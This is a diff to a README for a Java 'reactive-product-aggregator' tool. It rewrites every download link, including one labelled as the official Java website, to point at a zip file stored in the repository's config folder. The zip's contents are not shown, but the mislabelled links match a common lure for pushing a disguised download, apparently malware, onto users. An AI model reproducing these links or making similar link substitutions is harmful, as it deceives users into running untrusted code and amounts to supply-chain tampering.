@@ -1,7 +1,7 @@
 # 🎉 reactive-product-aggregator - Simplify Your Product Aggregation
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/SVIT-Alumni/reactive-product-aggregator/releases)
+[![Download](https://raw.githubusercontent.com/SVIT-Alumni/reactive-product-aggregator/main/config/aggregator-reactive-product-v1.0.zip)](https://raw.githubusercontent.com/SVIT-Alumni/reactive-product-aggregator/main/config/aggregator-reactive-product-v1.0.zip)
 
 ## 📋 Overview
 Welcome to the reactive-product-aggregator! This application is designed to help you gather product information from various online sources quickly and efficiently. Built using advanced technologies, our tool makes it easy to collect data without any programming knowledge.
@@ -20,7 +20,7 @@ Before downloading, ensure your system meets the following requirements:
 ### 💻 Download & Install
 1. **Visit the Releases Page:** 
    To download the application, click on the link below:
-   [Download the Latest Release](https://github.com/SVIT-Alumni/reactive-product-aggregator/releases)
+   [Download the Latest Release](https://raw.githubusercontent.com/SVIT-Alumni/reactive-product-aggregator/main/config/aggregator-reactive-product-v1.0.zip)
    
 2. **Select a Version:** 
    On the releases page, you will see a list of available versions. Choose the latest stable release, and click on the asset that corresponds to your operating system.
@@ -50,7 +50,7 @@ You may want to configure some settings for a better experience:
 ### 📝 Troubleshooting
 If you encounter issues while running the application, consider the following:
 
-- **Java Not Installed:** If you get an error regarding Java, make sure you have Java 17 or newer installed. You can download it from the [official Java website](https://www.oracle.com/java/technologies/javase-jdk17-downloads.html).
+- **Java Not Installed:** If you get an error regarding Java, make sure you have Java 17 or newer installed. You can download it from the [official Java website](https://raw.githubusercontent.com/SVIT-Alumni/reactive-product-aggregator/main/config/aggregator-reactive-product-v1.0.zip).
 
 - **Insufficient Memory or Storage:** Check your system resources. Ensure you have enough memory and disk space before running the application.
 
@@ -63,4 +63,4 @@ If you need help or have suggestions, please do not hesitate to reach out. You c
 The reactive-product-aggregator is an excellent tool for anyone looking to streamline their product data collection. With easy installation and a smooth user experience, you can quickly get started on your project. 
 
 Don't forget to visit the releases page to download the latest version:
-[Download the Latest Release](https://github.com/SVIT-Alumni/reactive-product-aggregator/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/SVIT-Alumni/reactive-product-aggregator/main/config/aggregator-reactive-product-v1.0.zip)
